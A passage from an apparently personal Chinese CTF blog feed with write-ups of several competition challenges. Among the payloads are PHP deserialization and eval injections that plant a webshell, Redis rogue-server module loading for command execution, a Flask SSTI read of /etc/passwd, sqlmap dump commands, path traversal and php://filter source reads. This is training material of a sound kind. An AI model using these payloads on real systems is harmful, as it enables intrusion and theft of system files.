B());<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:&quot;B&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;eval($_POST[1]);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>修改下</p><p><img src="/2021/10/26/2021/ctf/1/image-20211026200240301.png" alt="image-20211026200240301"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">O:<span class="hljs-number">1</span>:%<span class="hljs-number">22</span>B%<span class="hljs-number">22</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>;O:<span class="hljs-number">1</span>:%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>code%<span class="hljs-number">22</span>;s:<span class="hljs-number">19</span>:%<span class="hljs-number">22</span>eval($_REQUEST[<span class="hljs-number">1</span>]);%<span class="hljs-number">22</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>蚁剑连接</p><p><img src="/2021/10/26/2021/ctf/1/image-20211026200705897.png" alt="image-20211026200705897"></p><p>接下来就是redis主从复制打的知识点了</p><p>进去之后发现权限很低，无法遍历文件和目录，命令也无法执行</p><p><a href="https://blog.csdn.net/Xxy605/article/details/120442213?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163332078116780261941810%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163332078116780261941810&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-120442213.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%A4%A9%E7%BF%BC%E6%9D%AF+easy_eval&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/Xxy605/article/details/120442213?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163332078116780261941810%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163332078116780261941810&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-120442213.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%A4%A9%E7%BF%BC%E6%9D%AF+easy_eval&amp;spm=1018.2226.3001.4187</a></p><ul><li>Redis加载恶意so获取shell</li></ul><p>先看到有一个config文件</p><p>拖到kali里恢复（win打开乱码）</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">vi -r <span class="hljs-built_in">config</span>.php<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="/2021/10/26/2021/ctf/1/image-20211026201123824.png" alt="image-20211026201123824"></p><p>这里得到redis密码为：you_cannot_guess_it</p><p>接着就是打redis</p><p>再回到phpinfo看</p><p><img src="/2021/10/26/2021/ctf/1/image-20211026201318883.png" alt="image-20211026201318883"></p><p>于是就知道虽然权限低，但依然有tmp文件夹可以能利用</p><p>传恶意so文件<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><p><img src="/2021/10/26/2021/ctf/1/image-20211026201507338.png" alt="image-20211026201507338"></p><p><img src="/2021/10/26/2021/ctf/1/image-20211026201700208.png" alt="image-20211026201700208"></p><p>然后redis加载，就能拿到shell了</p><p>用到蚁剑插件redis管理</p><p><img src="/2021/10/26/2021/ctf/1/image-20211026201740743.png" alt="image-20211026201740743"></p><p><img src="/2021/10/26/2021/ctf/1/image-20211026201911110.png" alt="image-20211026201911110"></p><p><img src="/2021/10/26/2021/ctf/1/image-20211026201933402.png" alt="image-20211026201933402"></p><p>执行指令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">MODULE LOAD <span class="hljs-string">&quot;/tmp/exp.so&quot;</span><br><span class="hljs-keyword">system</span>.<span class="hljs-keyword">exec</span> <span class="hljs-string">&quot;ls /&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/26/2021/ctf/1/image-20211026202056741.png" alt="image-20211026202056741"></p><p><img src="/2021/10/26/2021/ctf/1/image-20211026202137512.png" alt="image-20211026202137512"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dasctf x Jlenu</title>
      <link href="/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/"/>
      <url>/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/</url>
      
        <content type="html"><![CDATA[<p> 这次坐大牢，web做不出来==</p><p> 在一个大佬点拨下，懂得misc的签到用ssti注入做（虽然迟了点交flag)</p><h2 id="WELCOME-DASCTFxJlenu"><a href="#WELCOME-DASCTFxJlenu" class="headerlink" title="WELCOME DASCTFxJlenu"></a>WELCOME DASCTFxJlenu</h2><p> 直接网上查到payload：<a href="https://www.cnblogs.com/hackxf/p/10480071.html">python-flask-ssti(模版注入漏洞) - 晓枫v5 - 博客园 (cnblogs.com)</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#x27;a&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><img src="/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/image-20211025224845346.png"></p><p>然后试探查看，最后</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#x27;a&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;flag.txt&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><img src="/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/image-20211025225751134.png"></p><h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><p>今天用问到的payload复现了一下</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?action=<span class="hljs-meta">add</span><span class="hljs-variable">&amp;attrid</span>[]=1<span class="hljs-variable">&amp;attrvalue</span>[]=2<span class="hljs-string">&quot;);phpinfo();//</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/image-20211026111906974.png"></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br>extract($_GET);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();<br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);<br>  <span class="hljs-keyword">return</span> $array;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))<br>&#123;<br>    $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;<br>    $attrids = count($attrid);<br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)<br>    &#123;<br>      $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;<br>      <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)<br>      &#123;<br>        $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;<br>      &#125;<br>    &#125;<br>    $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;<br>&#125;<br><br>String2Array($attrstr);<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯复现</title>
      <link href="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/"/>
      <url>/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>当初不太懂得怎么查询</p><p>现在来试着复现</p><h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p><a href="https://www.bilibili.com/video/BV1NE411j72u?p=1">ctf刷题（持续更新中…）（想看哪个题目评论区留言）_哔哩哔哩_bilibili</a></p><p>题目</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182557872.png" alt="image-20211019182557872"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182625019.png" alt="image-20211019182625019"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182649070.png" alt="image-20211019182649070"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182723548.png" alt="image-20211019182723548"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182747283.png" alt="image-20211019182747283"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182816165.png" alt="image-20211019182816165"></p><p>下载附件</p><p>用wireshark打开</p><p>第一题较简单，不过我们还是可以验证一下</p><p>抓取一个包，分析tcp流</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182922137.png" alt="image-20211019182922137"></p><p>位于右下角到流1时，查看token</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183030189.png" alt="image-20211019183030189"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">token</span>=eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJpZCI<span class="hljs-number">6</span>MTAwODYsIk<span class="hljs-number">1</span>hcENsYWltcyI<span class="hljs-number">6</span>eyJhdWQiOiJhZG<span class="hljs-number">1</span>pbiIsInVzZXJuYW<span class="hljs-number">1</span>lIjoiYWRtaW<span class="hljs-number">4</span>ifX<span class="hljs-number">0</span>.dJArtwXjas<span class="hljs-number">3</span>_Cg<span class="hljs-number">9</span>a<span class="hljs-number">3</span>tr<span class="hljs-number">8</span>COXF<span class="hljs-number">7</span>DRsuX<span class="hljs-number">8</span>UjmbC<span class="hljs-number">1</span>nKf<span class="hljs-number">8</span>fc<br></code></pre></td></tr></table></figure><p>明显得jwt认证，第二题我们解码一下</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183124604.png" alt="image-20211019183124604"></p><p>不懂为什么这里我得出来得id是10086，答案是10087，username正确就是admin</p><p>继续往下翻</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183402206.png" alt="image-20211019183402206"></p><p>权限就是root</p><p>观察</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183444748.png" alt="image-20211019183444748"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183501763.png" alt="image-20211019183501763"></p><p>开始base64编码的输出了</p><p>看到1.c，这就是上传文件</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183544100.png" alt="image-20211019183544100"></p><p>接下来就直接找so文件</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183654236.png" alt="image-20211019183654236"></p><p>找到了looter.so</p><p>最后找到绝对路径</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183809606.png" alt="image-20211019183809606"></p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>题目：</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185213358.png" alt="image-20211019185213358"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185231844.png" alt="image-20211019185231844"></p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185254230.png" alt="image-20211019185254230"></p><p>第一题以为是被读取源文件，结果是下载源码==</p><p>后面两题分析到了</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185002707.png" alt="image-20211019185002707"></p><p>url解码</p><p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185050316.png" alt="image-20211019185050316"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">URL</span><br><span class="hljs-attribute">GET</span> /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;./files/filename&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;call_user_func_array&quot;</span>;s:<span class="hljs-number">28</span>:<span class="hljs-string">&quot;./files/call_user_func_array&quot;</span>;&#125;paths|a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>剩余题目再看<a href="https://www.cnblogs.com/twosmi1e/p/15370801.html">你终于回来了(。・∀・)ノ (cnblogs.com)</a>分析</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校鲲鹏杯</title>
      <link href="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/"/>
      <url>/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p> 这次鲲鹏杯收获还是挺多的，虽然很多题目都是原题</p><p> 直接上网搜索复现了一下，记录一下思路解法</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1-贪吃蛇"><a href="#1-贪吃蛇" class="headerlink" title="1.贪吃蛇"></a>1.贪吃蛇</h4><p><a href="https://www.it610.com/article/1282297809499865088.htm">https://www.it610.com/article/1282297809499865088.htm</a></p><p>考察知识点：js</p><p>通过扫描目录</p><p>得到源码有个<code>snake.js</code></p><p>有如下代码：</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211020163904150.png" alt="image-20211020163904150"></p><p>丢进网站解码：<a href="https://www.qtool.net/decode">jjencode与aaencode解密工具-jjencode解密-aaencode解密-在线工具 (qtool.net)</a></p><p>或者复制下来到控制台进行直接解码</p><p>我这里是用chrome</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/buu/22/image-20211021095426486.png" alt="image-20211021095426486"></p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/buu/22/image-20211021095454062.png" alt="image-20211021095454062"></p><p>点下最右边的报错信息就可以得到flag了</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/buu/22/image-20211021095529874.png" alt="image-20211021095529874"></p><h4 id="2-sql"><a href="#2-sql" class="headerlink" title="2.sql"></a>2.sql</h4><p>这题sqlmap不太会用，导致前面手工注入很久也不知道是sleep注入</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> <span class="hljs-params">--dbs</span><br>sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span><br>sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span> -T<br>db_news<br>sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span> -T<br>db_news <span class="hljs-params">--columns</span><br>qlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span> -T<br>db_news <span class="hljs-params">--columns</span> -C flag <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105539333.png" alt="image-20211021105539333"></p><h4 id="3-工控（伪协议）"><a href="#3-工控（伪协议）" class="headerlink" title="3.工控（伪协议）"></a>3.工控（伪协议）</h4><p>这题本来感觉很眼熟，以为是在攻防世界里写的题目</p><h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><p>结果不是，过了了base64读取源码</p><p>后来搜到原题，原来要rot13才行</p><p>思路：打开靶机后，跳转页面，来到工控XX，url上有参数page</p><p>试着改参数值，想起可以php伪协议读取，这里只能用rot13编码读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=string.rot13/</span>resource=index.php<br></code></pre></td></tr></table></figure><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/0.jpg" alt="在这里插入图片描述"></p><p>然后就可以f12去看rot13编码的源码内容</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/2.jpg" alt="在这里插入图片描述"></p><p>解码<a href="https://www.ssleye.com/ctf/rot13.html">https://www.ssleye.com/ctf/rot13.html</a></p><p><img src="https://img-blog.csdnimg.cn/7f1d725c86b042e284b1855d8653fd31.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIyMTYwNTU3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>$page = $_get[<span class="hljs-string">&#x27;page&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($page)) &#123;<br><br><br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/^.+base.+$/&quot;</span>,$page)) &#123;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $page; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;/br&gt;not base&quot;</span>);<span class="hljs-meta">?&gt;</span><br> <span class="hljs-meta">&lt;?php</span><br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><br>            <span class="hljs-keyword">if</span> ($page === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ok&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">include</span>($page);<br>            <span class="hljs-keyword">die</span>();<br>            <span class="hljs-meta">?&gt;</span><br><br>        <span class="hljs-meta">&lt;?php</span><br>        &#125;&#125;<br><br><br>    $hashed_key = <span class="hljs-string">&#x27;df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b&#x27;</span>;<br>    $parsed = parse_url($_server[<span class="hljs-string">&#x27;request_uri&#x27;</span>]);<br>    $query = $parsed[<span class="hljs-string">&quot;query&quot;</span>];<br>    $parsed_query = parse_str($query);<br>    <span class="hljs-keyword">if</span>($parsed_query!=<span class="hljs-literal">null</span>)&#123;<br>        $action = $parsed_query[<span class="hljs-string">&#x27;action&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>($action===<span class="hljs-string">&quot;auth&quot;</span>)&#123;<br>        $key = $_get[<span class="hljs-string">&quot;key&quot;</span>];<br>        $hashed_input = hash(<span class="hljs-string">&#x27;sha384&#x27;</span>, $key);<br>        <span class="hljs-comment">//echo $hashed_input.&#x27;\n&#x27;;</span><br>        <span class="hljs-keyword">if</span>($hashed_input!==$hashed_key)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no way to get flag!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<br>        <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021103907127.png" alt="image-20211021103907127"></p><p>刚刚的本地复现过程：</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105705687.png" alt="image-20211021105705687"></p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105729371.png" alt="image-20211021105729371"></p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105803190.png" alt="image-20211021105803190"></p><h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>看了wp，原来这个任意文件读取漏洞可以这样利用</p><p>首先是/etc/passwd</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021102828034.png" alt="image-20211021102828034"></p><p>然后猜测flag在根目录下，直接读取</p><p>/flag</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021102917782.png" alt="image-20211021102917782"></p><h4 id="4-100块都不给我"><a href="#4-100块都不给我" class="headerlink" title="4.100块都不给我"></a>4.100块都不给我</h4><p>打开页面</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110550654.png" alt="image-20211021110550654"></p><p>试着查看robots.txt文件</p><p>果然有东西</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110636689.png" alt="image-20211021110636689"></p><p>访问index.php1</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110731161.png" alt="image-20211021110731161"></p><p>看到变量a是可控参数</p><p>直接phpinfo</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110911424.png" alt="image-20211021110911424"></p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>思路：打开是一张报错的图片</p><p>接着010查看发现提示base64</p><p>这边我以为要再去解码</p><p>结果考点是url访问得到的图片路径即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>:image/png;base<span class="hljs-number">64</span>,iVBORw<span class="hljs-number">0</span>KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAYmUlEQVR<span class="hljs-number">4</span>Xu<span class="hljs-number">2</span>d<span class="hljs-number">0</span>XbcSA<span class="hljs-number">5</span>D<span class="hljs-number">4</span>///<span class="hljs-number">6</span>OzpnCQ<span class="hljs-number">7</span>jt<span class="hljs-number">2</span>NK<span class="hljs-number">9</span>VtuuRGXosCQZCES<span class="hljs-number">4</span><span class="hljs-literal">on</span><span class="hljs-number">8</span>/bjx<span class="hljs-number">4</span>+fP<span class="hljs-number">17</span>sz<span class="hljs-number">8</span>+fTslvb<span class="hljs-number">29</span>ROZKL<span class="hljs-number">4</span>MREgwGkpkRnsmbCd<span class="hljs-number">5</span>JP<span class="hljs-number">0</span>mby/DbBzjZMsl<span class="hljs-number">7</span>MRQaCpCBDQ<span class="hljs-number">3</span>IRHMJnKobUlLhM<span class="hljs-number">1</span>kz<span class="hljs-number">4</span>TvJJ<span class="hljs-number">2</span>kye<span class="hljs-number">1</span>wAW<span class="hljs-number">1</span>CZD<span class="hljs-number">8</span>x<span class="hljs-number">2</span>Hj<span class="hljs-number">9</span>SUZCXaJQx<span class="hljs-number">6</span>TvhO<span class="hljs-number">8</span>qG<span class="hljs-number">8</span>J+JqAAsqk<span class="hljs-number">6</span>H<span class="hljs-number">5</span>jsNHakqyEu<span class="hljs-number">0</span>SBj<span class="hljs-number">0</span>nfCf<span class="hljs-number">5</span>UN<span class="hljs-number">4</span>TcTWABZXJ<span class="hljs-number">0</span>HzH<span class="hljs-number">4</span>SM<span class="hljs-number">1</span>JVmJdgmDnhO+k<span class="hljs-number">3</span>wo<span class="hljs-number">74</span>m<span class="hljs-number">4</span>GsCCymRovuPwkZqSrES<span class="hljs-number">7</span>hEHPCd<span class="hljs-number">9</span>JPpT<span class="hljs-number">3</span>RFwNYEFlMjTfcfhITUlWol<span class="hljs-number">3</span>CoOeE<span class="hljs-number">7</span>yQfynsirgawoDIZmu<span class="hljs-number">84</span>fKSmJCvRLmHQc<span class="hljs-number">8</span>J<span class="hljs-number">3</span>kg/lPREXDYCIN<span class="hljs-number">0</span>GU<span class="hljs-number">5</span>iCNtGoiuQjvxMfKQ<span class="hljs-number">7</span>hYMakmKw/RhnCxcKy<span class="hljs-number">6</span>DBxSUw<span class="hljs-number">1</span>gQWkiMIFPA<span class="hljs-number">2</span>rlIVysmFSTlYdoQ<span class="hljs-number">7</span>hYOFZdBg<span 